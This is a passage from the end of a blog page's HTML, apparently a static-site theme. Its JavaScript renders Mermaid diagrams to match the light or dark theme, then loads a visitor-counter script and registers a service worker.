      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

      Array.from($mermaidWrap).forEach((item, index) => {
        const mermaidSrc = item.firstElementChild
        const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
        const mermaidID = 'mermaid-' + index
        const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
        mermaid.mermaidAPI.render(mermaidID, mermaidDefinition, (svgCode) => {
          mermaidSrc.insertAdjacentHTML('afterend', svgCode)
        })
      })
    }

    const loadMermaid = () => {
      window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
    }

    window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>